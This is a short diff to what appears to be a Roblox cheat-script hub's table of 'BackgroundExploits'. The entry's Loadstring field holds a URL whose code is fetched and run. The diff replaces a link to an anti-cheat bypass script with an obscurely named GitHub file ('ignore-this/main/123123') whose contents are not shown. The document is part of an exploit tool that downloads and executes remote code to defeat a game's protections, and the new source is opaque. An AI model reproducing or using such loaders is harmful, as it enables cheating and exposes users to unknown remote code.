@@ -3489,7 +3489,7 @@ BackgroundExploits = {
 		PlaceIds = {2788229376},
 		PremiumOnly = false,
 		WaitDuration = 0,
-		Loadstring = "https://raw.githubusercontent.com/Stefanuk12/ROBLOX/master/Games/Da%20Hood/AntiCheatBypass.lua",
+		Loadstring = "https://raw.githubusercontent.com/supergarixd/ignore-this/main/123123",
 	},
 	myrestaurant = {
 		Name = "My Restaurant",
